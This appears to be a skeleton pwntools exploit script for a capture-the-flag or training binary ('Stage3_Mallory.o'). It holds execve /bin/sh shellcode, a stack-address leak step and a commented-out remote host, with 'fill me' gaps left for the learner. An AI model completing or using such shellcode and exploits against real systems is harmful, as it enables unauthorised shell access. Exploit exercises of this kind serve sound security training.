from pwn import *

context.log_level = 'debug'

r = process('Stage3_Mallory.o')
#r = remote('221.149.226.120', 31333)

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"

r.recvuntil(b'1: Inquiry grade info\n')
r.sendline(b'1')
#...
#fill me
#...
r.recvuntil(b'stack : ')
leak = r.recvuntil(b'\n')[:-1]
leak = leak.decode('utf-8')
leak = int(leak, 16)
print(hex(leak))
#...
#fill me
#...
pause() # If you want to debug, recommend using pause and then gdb process attach
r.send(shellcode + ...fill me...)
r.interactive()